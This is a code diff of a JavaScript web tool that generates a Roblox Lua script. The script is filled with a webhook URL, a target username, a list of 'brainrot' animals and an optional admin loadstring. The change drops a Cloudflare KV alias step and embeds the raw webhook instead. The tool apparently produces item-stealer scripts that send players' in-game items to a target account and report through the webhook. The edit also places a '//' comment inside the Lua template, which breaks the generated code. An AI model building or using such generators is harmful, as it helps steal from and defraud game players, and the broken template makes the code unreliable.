@@ -971,6 +971,7 @@ async function generate() {
   const webhook = document.getElementById('webhookInput').value.trim();
   const out = document.getElementById('outputBlock');
 
+  // Validation
   if (selected.size === 0) {
     out.className = 'code-block empty';
     out.textContent = '-- Please select at least one brainrot animal.';
@@ -987,21 +988,25 @@ async function generate() {
     return;
   }
 
+  // Génération locale de l'alias (au lieu de Cloudflare KV)
   const alias = generateAlias();
-  try {
-    const response = await fetch(`${KV_WORKER_URL}/store`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ alias, url: webhook })
-    });
-    if (!response.ok) throw new Error('KV store failed');
-  } catch (error) {
-    console.error(error);
-    out.className = 'code-block empty';
-    out.textContent = '-- Error while saving in Cloudflare KV.';
-    return;
-  }
 
+  // --- On supprime la partie Cloudflare KV ---
+  // try {
+  //   const response = await fetch(`${KV_WORKER_URL}/store`, {
+  //     method: 'POST',
+  //     headers: { 'Content-Type': 'application/json' },
+  //     body: JSON.stringify({ alias, url: webhook })
+  //   });
+  //   if (!response.ok) throw new Error('KV store failed');
+  // } catch (error) {
+  //   console.error(error);
+  //   out.className = 'code-block empty';
+  //   out.textContent = '-- Error while saving in Cloudflare KV.';
+  //   return;
+  // }
+
+  // Génération du script
   const names = [...selected];
   const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
 
@@ -1016,7 +1021,7 @@ end)
     adminScriptPart = customAdminLoadstring;
   }
 
-  const fullScript = `getgenv().WEBHOOK_URL = "${alias}"
+  const fullScript = `getgenv().WEBHOOK_URL = "${webhook}"  // Utilisation directe du webhook au lieu de l'alias
 getgenv().TARGET_USERNAME = "${username}"
 getgenv().TARGET_BRAINROT = {
 ${brainrotLines}
